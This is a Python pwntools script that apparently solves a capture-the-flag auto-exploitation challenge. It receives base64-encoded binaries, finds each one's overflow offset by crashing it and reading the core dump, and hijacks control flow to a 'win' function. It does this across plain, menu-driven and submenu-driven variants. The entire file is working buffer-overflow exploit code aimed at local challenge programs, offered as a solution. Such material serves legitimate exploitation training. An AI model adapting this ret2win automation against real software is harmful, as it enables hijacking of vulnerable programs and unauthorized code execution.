#!/bin/env python3

from pwn import *
from base64 import b64decode

ui = process(["./run"])

for i in range(5):
    ui.recvuntil(b'----\n')
    prog = b64decode(ui.recvuntil(b'----\n').strip(b'-\n'))

    tmp = Path("./tmp")

    with tmp.open("wb") as f:
        f.write(prog)

    tmp.chmod(0o700)

    context.binary = elf = ELF("tmp", checksec=False)

    p = elf.process(level='error')
    p.sendline(cyclic(0x300))
    p.wait()

    path = Path(f'core.{p.proc.pid}')
    core = Core(path.absolute().as_posix())
    path.unlink()

    ui.sendline(flat({core.fault_addr: elf.sym.win}))


for i in range(5):
    ui.recvuntil(b'----\n')
    prog = b64decode(ui.recvuntil(b'----\n').strip(b'-\n'))

    tmp = Path("./tmp")

    with tmp.open("wb") as f:
        f.write(prog)

    tmp.chmod(0o700)

    context.binary = elf = ELF("tmp", checksec=False)

    for i in range(5):
        p = elf.process(level='error')
        p.sendline(str(i).encode())

        if b'Submenu' in p.recvall(timeout=.2):
            for c in 'abcde':
                p = elf.process(level='error')
                p.sendline(str(i).encode())
                p.sendline(c.encode())

                if b'payload' in p.recvall(timeout=.2):
                    start = f'{i}\n{c}\n'.encode()


    print(start)
    p = elf.process(level='error')
    p.send(start)
    p.sendline(cyclic(0x300))
    p.wait()

    path = Path(f'core.{p.proc.pid}')
    core = Core(path.absolute().as_posix())
    path.unlink()

    ui.send(start)
    ui.sendline(flat({core.fault_addr: elf.sym.win}))


for i in range(10):
    ui.recvuntil(b'----\n')
    prog = b64decode(ui.recvuntil(b'----\n').strip(b'-\n'))

    tmp = Path("./tmp")

    with tmp.open("wb") as f:
        f.write(prog)

    tmp.chmod(0o700)

    context.binary = elf = ELF("tmp", checksec=False)

    menu = elf.read(elf.sym.main + 0x4a, 8)
    submenu = elf.read(elf.sym.submenu + 0x33, 8)

    p = elf.process(level='error')
    p.send(menu)
    p.send(submenu)
    p.sendline(cyclic(0x300))
    p.wait()

    path = Path(f'core.{p.proc.pid}')
    core = Core(path.absolute().as_posix())
    path.unlink()

    ui.send(menu)
    ui.send(submenu)
    ui.sendline(flat({core.fault_addr: elf.sym.win}))


ui.interactive()

